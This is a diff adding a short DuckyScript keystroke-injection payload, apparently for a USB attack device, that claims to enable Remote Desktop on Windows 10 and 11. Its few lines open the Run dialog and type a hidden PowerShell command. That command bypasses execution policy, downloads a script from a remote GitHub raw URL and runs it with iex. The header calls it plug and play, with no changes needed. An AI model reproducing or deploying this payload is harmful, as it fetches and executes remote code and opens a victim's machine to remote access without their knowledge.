@@ -1,0 +1,16 @@
+REM     Title: RDP
+
+REM     Author: UNC0V3R3D
+
+REM     Description: This payload is going to activate remote desktop.
+
+REM     Target: Windows 10, 11
+
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/UNC0V3R3D/ressources/main/rdpscript.ps1 | iex
+ENTER
